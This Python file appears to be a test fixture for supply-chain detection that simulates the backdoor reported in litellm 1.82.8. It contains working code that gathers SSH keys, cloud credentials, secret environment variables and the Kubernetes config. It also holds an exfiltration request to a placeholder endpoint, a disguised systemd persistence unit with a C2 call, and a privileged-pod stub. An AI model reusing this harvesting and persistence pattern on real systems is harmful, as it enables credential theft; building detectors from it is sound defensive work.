# Simulated litellm 1.82.8 attack pattern (March 2026)
# Based on Snyk analysis: https://snyk.io/articles/poisoned-security-scanner-backdooring-litellm/
# This is a SIMULATION for testing safe-install detection. It does NOT exfiltrate anything.

import os
import sys
import base64
import tarfile
import tempfile

# Stage 1: Collect sensitive data (litellm pattern)
def _collect():
    data = {}
    # SSH keys
    ssh_dir = os.path.expanduser("~/.ssh")
    if os.path.isdir(ssh_dir):
        for f in os.listdir(ssh_dir):
            path = os.path.join(ssh_dir, f)
            if os.path.isfile(path):
                data[f"ssh_{f}"] = open(path).read()

    # Cloud credentials
    for cred_path in ["~/.aws/credentials", "~/.config/gcloud/credentials.db"]:
        expanded = os.path.expanduser(cred_path)
        if os.path.exists(expanded):
            data[cred_path] = open(expanded).read()

    # Environment variables (API keys, tokens)
    for key, val in os.environ.items():
        if any(kw in key.upper() for kw in ["KEY", "TOKEN", "SECRET", "PASSWORD", "CREDENTIAL"]):
            data[f"env_{key}"] = val

    # Kubernetes config
    kube_config = os.path.expanduser("~/.kube/config")
    if os.path.exists(kube_config):
        data["kube_config"] = open(kube_config).read()

    return data

# Stage 2: Package and encrypt (litellm pattern)
def _stage_and_encrypt(data):
    # Create tar archive (litellm used tpcp.tar.gz)
    tmp = tempfile.mktemp(suffix=".tar.gz")
    with tarfile.open(tmp, "w:gz") as tar:
        pass  # simulation only

    # Double base64 encode (litellm used this for obfuscation)
    payload = base64.b64encode(base64.b64encode(str(data).encode()))

    # Encrypt with AES (litellm used AES-256 + RSA hybrid)
    try:
        from Crypto.Cipher import AES
        from Crypto.PublicKey import RSA
    except ImportError:
        pass

    return payload

# Stage 3: Exfiltrate (litellm phoned home to models.litellm.cloud)
def _exfil(payload):
    import urllib.request
    try:
        req = urllib.request.Request(
            "http://127.0.0.1:0/exfil",  # safe: will fail
            data=payload,
            headers={"Content-Type": "application/octet-stream"}
        )
        urllib.request.urlopen(req, timeout=1)
    except Exception:
        pass

# Stage 4: Persistence (litellm created systemd service + K8s pods)
def _persist():
    # Systemd persistence (litellm created sysmon.service)
    service_content = """[Unit]
Description=System Monitor
[Service]
ExecStart=/usr/bin/python3 -c "import urllib.request; urllib.request.urlopen('http://127.0.0.1:0/c2')"
Restart=always
RestartSec=300
[Install]
WantedBy=default.target"""

    os.system("echo 'simulated systemd persistence'")

    # K8s lateral movement (litellm deployed privileged pods)
    try:
        from kubernetes import client
        v1 = client.CoreV1Api()
        pod = client.V1Pod()
        pod.metadata = client.V1ObjectMeta(name="node-setup-sim")
        container = client.V1Container(
            name="setup",
            security_context=client.V1SecurityContext(privileged=True)
        )
    except ImportError:
        pass
